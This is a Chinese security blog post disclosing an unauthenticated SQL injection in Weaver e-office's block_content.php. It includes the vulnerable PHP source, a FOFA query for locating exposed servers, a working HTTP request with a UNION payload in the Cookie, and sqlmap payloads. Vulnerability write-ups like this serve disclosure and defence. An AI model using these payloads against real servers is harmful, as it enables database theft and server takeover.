---
title: "泛微e-office block_content.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-new_mytable-block_content-sqli.html
asset_dir: assets/泛微e-office-block_content.php-sql注入漏洞
---

# 泛微e-office block\_content.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/13 18:21
* 1475浏览
* [0评论](#comment)
* 18分钟阅读

深入探索

身份验证

Microsoft Office

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office block\_content.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/new\_mytable/block\_content.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
$nothingdata = $_lang['index_no_data'];
$block_id = $_REQUEST['block_id'];
$query = "\r\n\t\tSELECT BLOCK_TYPE FROM `index_block` WHERE BLOCK_ID={$block_id}  \r\n\t\t";
$rc = exequery( $connection, $query );
$row = mysql_fetch_array( $rc );
$block_type = $row['BLOCK_TYPE'];
include_once( "general/new_mytable/content_list/content_".$block_type.".php" );
?>
```

深入探索

防火墙软件

网络安全课程

技术文章订阅

`$block_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/new_mytable/block_content.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: block_id=1 UNION ALL SELECT CONCAT(0x7162707a71,0x6572537871644b6d50686268596d52564d654b6175746d52476b5a716c65567a52416b787a556a42,0x716a767171)-- -
```

[![泛微e-office block_content.php sql注入漏洞](images/img-001-6ed7230dbf88.webp)](https://image.mrxn.net/56d87a1fe15841b9974e55515177313b.webp)

成功在响应回显测试payload

编程

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: block_id=(SELECT (CASE WHEN (7092=7092) THEN 1 ELSE (SELECT 2050 UNION SELECT 8463) END))

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: block_id=1 AND 1181=BENCHMARK(4000000,MD5(0x76704871))

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: block_id=1 UNION ALL SELECT CONCAT(0x7162707a71,0x6572537871644b6d50686268596d52564d654b6175746d52476b5a716c65567a52416b787a556a42,0x716a767171)-- -
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office block\_content.php sql注入漏洞](https://mrxn.net/jswz/eoffice-general-new_mytable-block_content-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-general-new_mytable-block_content-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读

漏洞修复方案


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-new\_mytable-block\_content-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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